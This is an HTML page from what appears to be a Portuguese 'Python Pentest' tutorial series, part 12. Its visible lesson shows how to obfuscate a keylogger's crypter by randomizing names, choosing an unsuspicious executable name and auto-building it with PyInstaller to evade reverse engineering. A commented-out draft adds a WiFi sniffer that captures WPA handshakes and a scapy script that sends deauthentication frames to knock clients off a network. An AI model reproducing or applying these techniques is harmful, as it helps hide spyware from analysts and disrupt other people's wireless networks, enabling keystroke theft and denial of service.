<!DOCTYPE html>
<html lang="pt-br">
    <head>
        <meta charset="UTF-8"/>
        <link rel="icon" href="imagens/favicon.ico"/>
        <title>Aprenda Python Pentest</title>
        <link rel="stylesheet" href="css/estilo.css"/>
    </head>
    <body>
        <div>
            <header>
                <h1>Aprenda Python Pentest</h1>
                <menu>
                    <li><a href="index.html">Página Inicial</a></li>
                    <li><a href="contato.html">Contato!</a></li>
                    <li><a href="tudo-sobre-python-pentest-1.html">Tudo sobre Python Pentest Parte 1!</a></li>
                    <li><a href="tudo-sobre-python-pentest-2.html">Tudo sobre Python Pentest Parte 2!</a></li>
                    <li><a href="tudo-sobre-python-pentest-3.html">Tudo sobre Python Pentest Parte 3!</a></li>
                    <li><a href="tudo-sobre-python-pentest-4.html">Tudo sobre Python Pentest Parte 4!</a></li>
                    <li><a href="tudo-sobre-python-pentest-5.html">Tudo sobre Python Pentest Parte 5!</a></li>
                    <li><a href="tudo-sobre-python-pentest-6.html">Tudo sobre Python Pentest Parte 6!</a></li>
                    <li><a href="tudo-sobre-python-pentest-7.html">Tudo sobre Python Pentest Parte 7!</a></li>
                    <li><a href="tudo-sobre-python-pentest-8.html">Tudo sobre Python Pentest Parte 8!</a></li>
                    <li><a href="tudo-sobre-python-pentest-9.html">Tudo sobre Python Pentest Parte 9!</a></li>
                    <li><a href="tudo-sobre-python-pentest-10.html">Tudo sobre Python Pentest Parte 10!</a></li>
                    <li><a href="tudo-sobre-python-pentest-11.html">Tudo sobre Python Pentest Parte 11!</a></li>
                    <li><a href="tudo-sobre-python-pentest-12.html" onclick="alert('Você já Está na Matéria desse Link!'); return false">Tudo sobre Python Pentest Parte 12!</a></li>
                    <li><a href="tudo-sobre-python-pentest-13.html">Tudo sobre Python Pentest Parte 13!</a></li>
                </menu>
            </header>
           
<h2>Tudo sobre Python Pentest Parte 12</h2>

<h3>Automatizando Empacotamento</h3>

<p>Ao fazer engenharia reversa num exe que foi gerado através do empacotamento de um script Python, podemos obter todo o código-fonte de todo o programa. Para dificultar isso, podemos ofuscar nosso código.</p>

<p>Primeiramente, coloque todo o código do rawCode em outro arquivo separado. E no cripter, coloque isso no lugar da atribuição da variável do mesmo nome:</p>

<pre>
<code>
with open("rawCode.py") as arqRaw:
    rawCode = arqRaw.read()
    rawCode = rawCode.replace("{p2}", str(p2)).replace("{p1}", str(p1))
</code>
</pre>

<p>Rode o cripter com o comando <code>python Cripter.py Keylogger.exe</code>.</p>

<p>No entanto, devemos tornar nosso código o menos legível possível, pra evitar engenharia reversa por um profissional.</p>

<p>Num arquivo de teste, podemos fazer assim pra randomizar nomes:</p>

<pre>
<code>
import random, string

def randomName(n):
    name = ""

    for i in range(n):
        ch = random.choice(string.ascii_lowercase) # String com todos os caracteres minúsculos

        name += ch

    print(name)
    
randomName(10)
</code>
</pre>

<p>PS: Podemos colocar outros caracteres, como números, mas nomes de variáveis e funções devem ter o primeiro caractere sendo uma letra. Podemos fazer assim:</p>

<pre>
<code>
import random, string

def randomName(n):
    name = random.choice(string.ascii_lowercase)

    for i in range(n):
        ch = random.choice(string.ascii_lowercase + "1234567890")

        name += ch

    print(name)

randomName(15)
</code>
</pre>

<p>Daí, podemos substituir os nomes das funções e suas chamadas em rawCode por dois caracteres <q>&lt</q>; e <q>&gt;</q>, como por exemplo:</p>

<pre>
<code>
def &lt;filed&gt;():
    # Restando do código

&lt;filed&gt;()
</code>
</pre>

<p>E aí, no Cripter, podemos fazer assim, debaixo da variável rawCode, no with open do arquivo Python de mesmo nome:</p>

<pre>
<code>
randomize = ["&lt;criarProc&gt;", "&lt;filed&gt;", "&lt;saveFile&gt;"]

for r in randomize:
    rawCode = rawCode.replace(r, randomName(10))
</code>
</pre>

<p>Claro que não podemos esquecer de declarar a função randomName e suas importações no Cripter, só retire o print e substitua pelo return:</p>

<pre>
<code>
import random, string

def randomName(n):
    name = random.choice(string.ascii_lowercase)

    for i in range(n):
        ch = random.choice(string.ascii_lowercase + "1234567890")

        name += ch
        
    return name
</code>
</pre>

<p>PS: O ideal é fazer isso não só com as funções em rawCode, mas com as variáveis também, pelo menos as de nomes muito explícitos.</p>

<p>Já com as importações, apenas usamos algo do tipo:</p>

<pre>
<code>
import base64 as &lt;base64&gt;
import psutil as &lt;psutil&gt;
</code>
</pre>

<p>E onde estão as utilizações das importações:</p>

<pre>
<code>
process = &lt;psutil&gt;.Popen("code.exe")
</code>
</pre>

<p>E no Cripter, adicionar todas as entradas na lista assim:</p>

<pre>
<code>
randomize = ["&lt;criarProc&gt;", "&lt;filed&gt;", "&lt;saveFile&gt;", "&lt;base64&gt;", "&lt;psutil&gt;", "&lt;process&gt;", "&lt;arqExe&gt;", "&lt;fCpu&gt;", "&lt;lCpu&gt;", "&lt;cpu&gt;", "&lt;memTot&gt;", "&lt;mem&gt;"]
</code>
</pre>

<p>Dá pra fazer com tudo no código, inclusive no nome do executável a ser salvo (escrito), no entanto isso despertaria mais suspeitas, o ideal é colocar um nome menos suspeito. Podemos aplicar isso no nosso keylogger também.</p>

<p>Podemos também no nosso Cripter, colocar a importação do Pyinstaller diretamente, da forma <code>import PyInstaller.__main__</code>, pra gerar o instalador automaticamente. No final do código, basta chamar assim:</p>

<pre>
<code>
PyInstaller.__main__.run(("codigo.py", "-F", "-w", "--distpath", "./", "--name", "codigo.exe", "--clean"))

shutil.rmtree("build") # Importe shutil
os.remove("codigo.exe.spec")
</code>
</pre>

<!--
-- Corrigir

Monitorando Redes WLAN

Podemos criar uma ferramenta com uma funcionalidade parecida com o Aircrack-ng, que é um software usado para monitorar redes wi-fi. Para isso, precisaremos instalar primeiramente a biblioteca pyshark.

PS: Essa lição funciona melhor em sistemas Linux.

Vamos supor que nosso programa se chamará Pyrodump, vamos deixar ele inicialmente assim:

import pyshark

captura = pyshark.LiveCapture(interface = "wlan0mon")

for c in captura.sniff_continuously():
    print(c)

Claro que isso só capturará algo se a gente tiver tráfego na rede wi-fi. Podemos verificar isso num programa como o Wireshark. Nele podemos ver coisas como o nome da rede wi-fi, endereços MAC, tipo de criptografia, entre outras coisas.

Só que ele só pegará os dados só da nossa própria rede, não das outras. Algumas ferramentas, como o próprio Airodump, alterna entre os canais pra capturar todas as informações de todas as frequências.

Deixe a ferramenta assim:

import pyshark
import subprocess
import threading
import time

def cCanal():
    while True:
        for c in range(1, 14 + 1):
            subprocess.run(("iwconfig",  iFace, "channel", str(c)))
            time.sleep(0.5)

iFace = "wlan0mon"

tCanal = threading.Thread(target = cCanal)
tCanal.start()

captura = pyshark.LiveCapture(interface = iFace) # No Linux pode ser algo como wlan0mon

for c in captura.sniff_continuously():
    print(c)

Defina essa função no código:

def parsingPacket(pacote):
    print(pacote.wlan.fc_type)

E no último for, deixe ele assim:

for c in captura.sniff_continuously():
    parsingPacket(c)

Deixe a função parsingPacket assim:

def parsingPacket(pacote):
    if pacote.wlan.fc_type == "0":
        print(pacote.wlan.bssid)

E depois assim:

def parsingPacket(pacote):
    if pacote.wlan.fc_type == "0":
        print(pacote["WLAN.MGT"])

Defina também essa função:

def extrair(camada, chave):
    valor = camada.split(chave)[1]
    
    print(valor)
    exit()

E deixe a parsingPacket assim:

def parsingPacket(pacote):
    if pacote.wlan.fc_type == "0":
        wlanMgt = str(pacote["WLAN.MGT"])
        
        extrair(wlanMgt, "SSID:")

Deixe a extrair assim:

def extrair(camada, chave):
    valor = camada.split(chave)[1]
    valor = valor.replace("\x1b[0m\x1b[1m ", "").strip("\"") # Não esqueça do espaço
    
    return valor

E a parsingPacket assim:

def parsingPacket(pacote):
    if pacote.wlan.fc_type == "0":
        wlanMgt = str(pacote["WLAN.MGT"])

        essid = extrair(wlanMgt, "SSID:")
        
        print(essid)

E depois assim:

def parsingPacket(pacote):
    if pacote.wlan.fc_type == "0":
        wlanMgt = str(pacote["WLAN.MGT"])

        bssid = pacote.wlan.bssid
        essid = extrair(wlanMgt, "SSID:")
        canal = extrair(wlanMgt, "Current Channel:")

        print(bssid, essid, canal)

Fora das funções, defina esse código:

global redes
redes = dict()

E o parsingPacket, deixe assim:

def parsingPacket(pacote):
    if pacote.wlan.fc_type == "0":
        wlanMgt = str(pacote["WLAN.MGT"])

        bssid = pacote.wlan.bssid

        try:
            essid = extrair(wlanMgt, "SSID:")
            canal = extrair(wlanMgt, "Current Channel:")
        except IndexError:
            print(pacote)
            exit()

        if bssid not in redes:
            redes[bssid] = essid
            print(bssid, essid, canal)

Defina essa função:

def criptografia(pacote):
    if "RSN" in pacote:
        return "WPA2/RSN"
    elif "WPA" in pacote:
        return "WPA"
    elif "WEP" in pacote:
        return "WEP"
    else:
        return "Sem Criptografia"

E no parsingPacket, invoque a função assim, antes do try:

cifra = criptografia(wlanMgt)

E no print dentro do if:

print(f"{bssid}\t{canal}\t{cifra}\t{essid}")

E fora de qualquer função, entre o start do thread e antes de captura:

print(f"BSSID\tCANAL\tCIFRA\tESSID")

Argumentos e Salvando Captura

O problema do programa que fizemos até agora, é que não conseguimos dar um Ctrl C para que ele pare, sem que ele dê erros.

Deixe a função cCanal assim:

def cCanal(evento):
    while not evento.is_set:
        for c in range(1, 14 + 1):
            subprocess.run(("iwconfig",  iFace, "channel", str(c)))
            time.sleep(0.5)

E deixe abaixo da interface de rede assim:

evento = threading.Event()

try:
    tCanal = threading.Thread(target = cCanal, args = (evento,))

    tCanal.start()

    print(f"BSSID\tCANAL\tCIFRA\tESSID")

    captura = pyshark.LiveCapture(interface = iFace)

    for c in captura.sniff_continuously():
        parsingPacket(c)
except KeyboardInterrupt:
    evento.set()
    captura.close_async()
    captura.close()

Agora, no começo do código coloque as importações com import signal, e deixe dentro do Except assim:

   evento.set()
    os.killpg(os.getpid(), signal.SIGTERM)
    captura.close_async()
    captura.close()

Assim ele não dará erro com o PyShark.

Coloque esse código numa função e deixe fora dela apenas a declaração de redes, iFace e a invocação da mesma:

def capturar():
    evento = threading.Event()

    try:
        tCanal = threading.Thread(target = cCanal, args = (evento,))

        tCanal.start()

        print(f"BSSID\tCANAL\tCIFRA\tESSID")

        captura = pyshark.LiveCapture(interface = iFace)

        for c in captura.sniff_continuously():
            parsingPacket(c)
    except KeyboardInterrupt:
        evento.set()
        os.killpg(os.getpid(), signal.SIGTERM)
        captura.close_async()
        captura.close()
        
global redes
redes = dict()

iFace = "wlan0mon"

capturar()

Agora coloque a importação de argparse com import argparse, e antes da declaração da variável redes, fora de qualquer função, deixe assim:

parser = argparse.ArgumentParser()

parser.add_argument("-i", type = str, required = True, help = "Interface de Monitoramento")
parser.add_argument("--bssid", type = str, help = "Filtra por BSSID da Rede")
parser.add_argument("-c", type = str, help = "Define um Canal Estático")
parser.add_argument("-w", type = str, help = "Salva Captura em um Arquivo PCAP")

args = parser.parse_args()

print(args.i)
print(args.bssid)
print(args.c)
print(args.w)

Aí, retire os prints e deixe apenas isso abaixo do args:

global redes
redes = dict()

iFace = args.i

capturar()

E deixe a função cCanal assim:

def cCanal(evento):
    if args.c is not None:
        subprocess.run(("iwconfig", iFace, "channel", str(args.c)))
    else:
        while not evento.is_set:
            for c in range(1, 14 + 1):
                subprocess.run(("iwconfig",  iFace, "channel", str(c)))
                time.sleep(0.5)

Defina essa função no código:

def verifBSSID(pacote, bssid):
    if "WLAN" in pacote:
        try:
            redeBSSID = pacote.wlan.bssid
        except AttributeError:
            return False

        if redeBSSID == bssid:
            return True

    return False

Daí é só executar o script com python3 Pyrodump.py -i wlan0mon --bssid 00:11:22:aa:bb:cc -c 4.

E deixe o for do capturar assim:

for c in captura.sniff_continuously():
    if not args.bssid or verifBSSID(c, args.bssid):
        parsingPacket(c)

E a variável captura da mesma função, deixe assim, para salvarmos um arquivo com o scan:

if args.w:
    captura = pyshark.LiveCapture(interface = iFace, output_file = iFace)
else:
    captura = pyshark.LiveCapture(interface = iFace)

Identificando 4way Handshake

Os pacotes de handshake são os pacotes do tipo EAPOL, que podemos interceptar por um programa como o Wireshark. Pra fazer o mesmo no nosso script, podemos fazer assim, dentro da função parsingPacket, no final dela, fora de qualquer outro if:

if "EAPOL" in pacote:
    print(pacote)

O EAPOL handshake tem quatro capturas, com mensagens de 1 a 4, que, se tiverem o mesmo MAC, significa que é um handshake.

Deixe o mesmo if acima assim:

if "EAPOL" in pacote:
    bssid = pacote.wlan.bssid
    print(pacote["EAPOL"])

E depois assim:

if "EAPOL" in pacote:
    bssid = pacote.wlan.bssid
    eapol = str(pacote["EAPOL"])
    n = extrair(eapol, "Message number:")
    print(bssid, n)

Fora de qualquer função, antes da invocação de capturar, defina esse dicionário:

handshake = {"1": False, "2": False, "3": False, "4": False}

Deixe o último if de parsingPacket assim:

if "EAPOL" in pacote:
    bssid = pacote.wlan.bssid
    eapol = str(pacote["EAPOL"])
    n = extrair(eapol, "Message number:")
    handshake[n] = True

    if all(handshake.values()):
        print("Handshake Capturado!")

Ferramenta de Desautenticação

Ao analisar um tráfego de rede pelo Wireshark, podemos encontrar em um dos pacotes, frames com flags de desautenticação e gerenciamento wireless. Podemos ver quais roteadores estão transmitindo e recebendo informações. Um programa como o Aireplay consegue se passar por um deles, e todo mundo que ler esse pacote vai se desautenticar da rede e posteriormente se reconectar. Ele é enviado sem criptografia na rede.

PS: Na função parsingPacket, podemos deixar o if do bssid (abaixo do try except) assim pra não dar erros nas análises:

if bssid not in redes and bssid != "ff:ff:ff:ff:ff:ff":
    redes[bssid] = essid
    print(f"{bssid}\t{canal}\t{cifra}\t{essid}")

Num arquivo de teste, faça esse código:

from scapy.all import *
from scapy.layers.dot11 import *
import argparse

def enviaDeauth(apBssid, interface, count):
    pacote = RadioTap() / Dot11(addr1 = "ff:ff:ff:ff:ff:ff", addr2 = apBssid, addr3 = apBssid) / Dot11Deauth()

    sendp(pacote, iface = interface, count = count, inter = 0.1, verbose = 1)

parser = argparse.ArgumentParser()

parser.add_argument("-a", required = True, help = "Define AP do Alvo")
parser.add_argument("-i", required = True, help = "Define Interface em Modo Monitor")
parser.add_argument("-c", type = int, required = True, help = "Número de Pacotes a Enviar")

args = parser.parse_args()

enviaDeauth(args.a, args.i, args.c)

Daí é só executar python3 Pyreplay.py -a f8:1a:67:f2:8f:a8 -i wlan0mon -c 1

PS: Podemos converter o arquivo PCAPNG gerado pela nossa ferramenta com o Editcap, ferramenta padrão do Wireshark, usando apenas na sintaxe editcap -F pcap capturahand capturahand.pcap.

Pra automatizar isso no Pyrodump, vá no except de KeyboardInterrupt de capturar, e coloque isso entre o evento.set e o os.killpg:

if args.w:
    subprocess.run(("editcap", "-F", "pcap", args.w, f"{args.w}.pcap"))

-->

<ul>
    <li><a href="tudo-sobre-python-pentest-11.html">Parte Anterior da Matéria!</a></li>
    <li><a href="tudo-sobre-python-pentest-13.html">Continuação da Matéria!</a></li>
</ul>

        </div>
    </body>
</html>